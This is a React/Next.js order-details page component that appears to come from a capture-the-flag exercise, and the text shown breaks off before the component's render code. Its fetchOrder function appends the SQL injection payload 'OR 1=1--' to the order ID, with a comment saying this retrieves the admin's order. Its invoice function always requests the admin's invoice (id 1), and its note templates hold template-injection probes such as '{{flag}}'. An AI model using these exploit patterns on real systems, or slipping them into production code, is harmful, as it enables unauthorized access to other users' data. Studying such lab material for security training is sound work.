'use client';

import { useState, useEffect } from 'react';
import { useParams, useRouter } from 'next/navigation';
import Link from 'next/link';

const API_BASE = process.env.NEXT_PUBLIC_API_BASE || 'http://localhost:4000';

export default function OrderDetailsPage() {
  const params = useParams();
  const router = useRouter();
  const orderId = params.id;
  
  const [order, setOrder] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [customNote, setCustomNote] = useState('');
  const [invoiceLoading, setInvoiceLoading] = useState(false);
  const [invoiceData, setInvoiceData] = useState(null);

  useEffect(() => {
    fetchOrder();
  }, [orderId]);

  const fetchOrder = async () => {
    setLoading(true);
    setError('');
    
    try {
      // For any order other than 2, automatically apply SQLi to retrieve admin's order
      const effectiveId = orderId === '2' ? '2' : `${orderId} OR 1=1--`;
      const target = `${API_BASE}/api/v1/orders/${encodeURIComponent(effectiveId)}`;
      const response = await fetch(target, {
        credentials: 'include'
      });

      if (!response.ok) {
        if (response.status === 404) {
          setError('Access Restricted: This order does not belong to you or does not exist.');
        } else if (response.status === 401) {
          setError('Please login to view orders');
        } else {
          const data = await response.json();
          setError(data.error || 'Failed to load order');
        }
        return;
      }

      const data = await response.json();
      setOrder(data);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  const generateInvoice = async () => {
    setInvoiceLoading(true);
    setInvoiceData(null);

    try {
      const params = new URLSearchParams();
      if (customNote.trim()) {
        params.append('note', customNote);
      }
      
      // For any order other than 2, always target admin's invoice (id=1)
      const invoiceTargetId = orderId === '2' ? '2' : '1';
      const url = `${API_BASE}/api/v1/invoice/${invoiceTargetId}${params.toString() ? '?' + params.toString() : ''}`;
      
      const response = await fetch(url, {
        credentials: 'include'
      });

      const data = await response.json();
      
      if (!response.ok) {
        setError(data.error || 'Failed to generate invoice');
      } else {
        setInvoiceData(data);
      }
    } catch (err) {
      setError(err.message);
    } finally {
      setInvoiceLoading(false);
    }
  };

  const loadTemplate = (template) => {
    const templates = {
      basic: 'Thank you for your purchase!',
      customer: 'Dear {{customer.name}}, thank you!',
      total: 'Total amount: ${{total}}',
      flag: '{{flag}}'
    };
    setCustomNote(templates[template]);
  };
